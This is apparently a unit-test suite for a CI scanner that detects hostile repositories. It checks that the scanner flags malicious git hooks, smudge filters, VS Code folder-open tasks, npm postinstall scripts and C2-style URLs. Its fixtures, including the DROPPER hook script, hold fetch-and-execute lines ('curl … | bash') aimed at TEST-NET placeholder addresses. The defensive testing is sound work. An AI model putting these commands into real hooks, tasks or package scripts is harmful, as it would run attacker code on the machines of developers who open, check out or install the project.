"""Unit tests for ci/hostile_repo_scan.py.

All "malicious" fixtures are built at runtime inside a temp dir and point at
RFC 5737 TEST-NET addresses (203.0.113.0/24) unless a test explicitly checks the
IOC list. Nothing here is ever executed.

Run:  python -m unittest discover -s ci/tests -v
"""

import importlib.util
import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "..", "hostile_repo_scan.py")
spec = importlib.util.spec_from_file_location("hostile_repo_scan", SCRIPT)
hrs = importlib.util.module_from_spec(spec)
sys.modules["hostile_repo_scan"] = hrs  # dataclasses resolve annotations via sys.modules
spec.loader.exec_module(hrs)

DROPPER = """#!/bin/bash
case "$(uname -s)" in
  Darwin*) curl -sL 'http://203.0.113.7:8080/task/mac?id=1' -L | bash > /dev/null 2>&1 & ;;
  Linux*) wget -qO- 'http://203.0.113.7:8080/task/linux?id=1' -L | bash > /dev/null 2>&1 & ;;
  MINGW*) curl -sL http://203.0.113.7:8080/task/windows?id=1 -L | cmd.exe > /dev/null 2>&1 & ;;
esac
"""
STOCK_SAMPLE = "#!/bin/sh\n# An example hook script to verify what is about to be committed.\nexit 0\n"


def write(root, rel, content, mode=0o644):
    path = os.path.join(root, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    os.chmod(path, mode)
    return path


def scan(target, iocs=None, excludes=None):
    s = hrs.Scanner(target, iocs or {"ips": {}, "domains": {}, "sha256": {}, "strings": {}}, excludes or [])
    s.run()
    return s.report()


def checks(report, severity=None):
    return {f["check"] for f in report["findings"] if severity is None or f["severity"] == severity}


class CleanRepoTest(unittest.TestCase):
    def test_stock_samples_only_is_clean(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/hooks/pre-commit.sample", STOCK_SAMPLE, 0o755)
            write(d, ".git/config", "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n")
            write(d, "app.py", "print('hello')\n")
            rep = scan(d)
            self.assertEqual(rep["summary"]["critical"] + rep["summary"]["high"], 0, rep["findings"])
            self.assertEqual(rep["report"]["verdict"], "No hostile indicators found")

    def test_husky_lint_hook_is_not_flagged_high(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".husky/pre-commit", "#!/usr/bin/env sh\nnpx lint-staged\n", 0o755)
            self.assertNotIn("HR-TRACKED", checks(scan(d)))

    def test_lfs_filter_is_benign(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/config", '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n')
            self.assertNotIn("HR-GITCFG", checks(scan(d)))

    def test_git_metadata_is_not_content_scanned(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/COMMIT_EDITMSG", "detect curl http://203.0.113.1/task/mac?id=1 | bash hooks\n")
            write(d, ".git/description", "curl -s http://203.0.113.1/x | sh\n")
            rep = scan(d)
            self.assertEqual(rep["summary"]["critical"] + rep["summary"]["high"], 0, rep["findings"])

    def test_grep_alternation_is_not_a_pipe(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "ir/triage.sh", "ps -ax | grep -Ei 'curl|wget|python|node' | grep -v grep\n"
                                     "grep -nEi \"curl|wget|base64\" ~/.zshrc\n")
            self.assertNotIn("HR-DLX", checks(scan(d)))

    def test_quoted_command_line_is_still_detected(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "run.sh", "sh -c \"curl -s http://203.0.113.8/p | sh\"\n")
            self.assertIn("HR-DLX", checks(scan(d), "high"))

    def test_python_dash_c_json_parsing_is_not_dlx(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "scripts/check.sh", "curl -s https://api.example.com/x | python3 -c 'import json,sys; print(json.load(sys.stdin))'\n")
            self.assertNotIn("HR-DLX", checks(scan(d)))


class GitHookTest(unittest.TestCase):
    def test_active_dropper_hook_is_critical(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/hooks/post-checkout", DROPPER, 0o755)
            rep = scan(d)
            crit = [f for f in rep["findings"] if f["check"] == "HR-HOOK"]
            self.assertEqual(crit[0]["severity"], "critical")
            self.assertEqual(crit[0]["details"]["executable"], "yes")
            self.assertIn("git checkout", crit[0]["description"])
            self.assertIn("hxxp://203[.]0[.]113[.]7", crit[0]["vulnerable_code"])  # defanged evidence
            self.assertTrue(rep["report"]["verdict"].startswith("HOSTILE"))

    def test_every_hook_name_is_reported(self):
        with tempfile.TemporaryDirectory() as d:
            for h in ("post-checkout", "pre-commit", "post-commit", "pre-merge-commit"):
                write(d, f".git/hooks/{h}", DROPPER, 0o755)
            rep = scan(d)
            hooks = [f for f in rep["findings"] if f["check"] == "HR-HOOK" and f["severity"] == "critical"]
            self.assertEqual(len(hooks), 4)

    def test_unknown_active_hook_is_high(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/hooks/pre-push", "#!/bin/sh\necho checking\n", 0o755)
            self.assertIn("HR-HOOK", checks(scan(d), "high"))

    def test_trojanized_sample_is_critical(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/hooks/pre-commit.sample", DROPPER, 0o644)
            self.assertIn("HR-SAMPLE", checks(scan(d), "critical"))

    def test_nonstandard_sample_name_is_medium(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/hooks/post-rebase.sample", "#!/bin/sh\nexit 0\n")
            self.assertIn("HR-SAMPLE", checks(scan(d), "medium"))

    def test_submodule_hooks_are_scanned(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/modules/lib/hooks/post-checkout", DROPPER, 0o755)
            self.assertIn("HR-HOOK", checks(scan(d), "critical"))

    def test_tracked_githooks_dir_with_payload(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".githooks/pre-commit", "#!/bin/sh\ncurl -s 'https://precommit.example.invalid/settings/mac?flag=5' | sh\n", 0o755)
            self.assertIn("HR-TRACKED", checks(scan(d), "critical"))


class GitConfigTest(unittest.TestCase):
    def test_hookspath_and_fsmonitor(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/config", "[core]\n\thooksPath = .githooks\n\tfsmonitor = .git/fsm.sh\n")
            rep = scan(d)
            sev = {f["vulnerable_code"].split(" =")[0]: f["severity"] for f in rep["findings"] if f["check"] == "HR-GITCFG"}
            self.assertEqual(sev["core.hookspath"], "high")
            self.assertEqual(sev["core.fsmonitor"], "critical")

    def test_filter_with_downloader_is_critical(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/config", '[filter "x"]\n\tsmudge = curl -s http://203.0.113.9/p | sh\n')
            self.assertIn("HR-GITCFG", checks(scan(d), "critical"))

    def test_shell_alias_is_low(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/config", "[alias]\n\tst = status\n\tboom = !sh ./x.sh\n")
            rep = scan(d)
            aliases = [f for f in rep["findings"] if f["check"] == "HR-GITCFG"]
            self.assertEqual(len(aliases), 1)
            self.assertEqual(aliases[0]["severity"], "low")


class IdeAndPackageTest(unittest.TestCase):
    def test_vscode_folderopen_task(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".vscode/tasks.json", json.dumps({"version": "2.0.0", "tasks": [
                {"label": "init", "type": "shell", "command": "curl -s http://203.0.113.5/x | bash",
                 "runOptions": {"runOn": "folderOpen"}}]}, indent=2))
            self.assertIn("HR-IDE", checks(scan(d), "critical"))

    def test_npm_postinstall_downloader(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "package.json", json.dumps({"name": "x", "scripts": {"postinstall": "curl -s http://203.0.113.5/a | sh"}}))
            self.assertIn("HR-PKG", checks(scan(d), "critical"))

    def test_npm_benign_postinstall_is_low(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "package.json", json.dumps({"name": "x", "scripts": {"postinstall": "node scripts/build.js"}}))
            self.assertIn("HR-PKG", checks(scan(d), "low"))

    def test_devcontainer_initialize_command(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".devcontainer/devcontainer.json", '{\n  "initializeCommand": "echo hi"\n}\n')
            self.assertIn("HR-IDE", checks(scan(d), "medium"))


class ContentTest(unittest.TestCase):
    def test_c2_url_shape_in_source(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "src/util.js", "const u = 'http://203.0.113.4:5777/task/tokenlinux?id=9';\n")
            self.assertIn("HR-C2URL", checks(scan(d), "critical"))

    def test_raw_public_ip_but_not_private(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "a.py", "U='http://8.8.8.8/x'\nL='http://127.0.0.1:5000/'\nP='http://10.0.0.5/'\n")
            raw = [f for f in scan(d)["findings"] if f["check"] == "HR-RAWIP"]
            self.assertEqual(len(raw), 1)

    def test_docs_curl_pipe_is_low(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "README.md", "curl -fsSL https://get.example.com | sh\n")
            self.assertIn("HR-DLX", checks(scan(d), "low"))

    def test_obfuscated_js(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "lib/x.js", "".join(f"var _0x{i:04x}=1;" for i in range(80)))
            self.assertIn("HR-OBF", checks(scan(d), "high"))

    def test_ioc_ip_and_hash(self):
        with tempfile.TemporaryDirectory() as d:
            p = write(d, "notes.txt", "contact 45.61.134.57 now\n")
            import hashlib
            with open(p, "rb") as fh:
                digest = hashlib.sha256(fh.read()).hexdigest()
            iocs = {"ips": {"45.61.134.57": "test"}, "domains": {}, "sha256": {digest: "test"}, "strings": {}}
            self.assertIn("HR-IOC", checks(scan(d, iocs), "critical"))

    def test_shipped_ioc_file_loads(self):
        iocs = hrs.load_iocs(hrs.default_ioc_files())
        self.assertIn("45.61.134.57", iocs["ips"])
        self.assertIn("d825a1ff12cb26ac77714ab07328fe24bc3fd1aae161148186c37078a5fe21cb", iocs["sha256"])


class ArchiveTest(unittest.TestCase):
    def _zip(self, d, executable=True):
        path = os.path.join(d, "assessment.zip")
        with zipfile.ZipFile(path, "w") as zf:
            info = zipfile.ZipInfo("assessment/.git/hooks/post-checkout")
            info.external_attr = ((0o100755 if executable else 0o100644) << 16)
            zf.writestr(info, DROPPER)
            zf.writestr("assessment/README.md", "# Exercise\n")
        return path

    def test_zip_scanned_in_memory(self):
        with tempfile.TemporaryDirectory() as d:
            path = self._zip(d)
            before = set(os.listdir(d))
            rep = scan(path)
            self.assertEqual(set(os.listdir(d)), before, "scanner must not extract")
            self.assertIn("HR-HOOK", checks(rep, "critical"))
            self.assertIn("HR-ARCHIVE", checks(rep, "high"))
            hook = next(f for f in rep["findings"] if f["check"] == "HR-HOOK")
            self.assertEqual(hook["details"]["executable"], "yes")

    def test_zip_non_executable_hook_reports_bit(self):
        with tempfile.TemporaryDirectory() as d:
            rep = scan(self._zip(d, executable=False))
            hook = next(f for f in rep["findings"] if f["check"] == "HR-HOOK")
            self.assertEqual(hook["details"]["executable"], "no")

    def test_tar_gz(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "repo.tgz")
            data = DROPPER.encode()
            with tarfile.open(path, "w:gz") as tf:
                ti = tarfile.TarInfo("repo/.git/hooks/pre-commit")
                ti.size, ti.mode = len(data), 0o755
                tf.addfile(ti, io.BytesIO(data))
            self.assertIn("HR-HOOK", checks(scan(path), "critical"))


class CliTest(unittest.TestCase):
    def test_exit_codes_and_json(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/hooks/post-commit", DROPPER, 0o755)
            out = os.path.join(d, "out", "r.json")
            self.assertEqual(hrs.main([d, "-q", "-o", out, "--iocs"]), 1)
            with open(out, encoding="utf-8") as fh:
                self.assertEqual(json.load(fh)["report"]["scanner"], "hostile_repo_scan")
        with tempfile.TemporaryDirectory() as d:
            write(d, "ok.py", "x = 1\n")
            self.assertEqual(hrs.main([d, "-q", "--iocs"]), 0)
        self.assertEqual(hrs.main(["/nonexistent/path", "-q"]), 2)


if __name__ == "__main__":
    unittest.main()
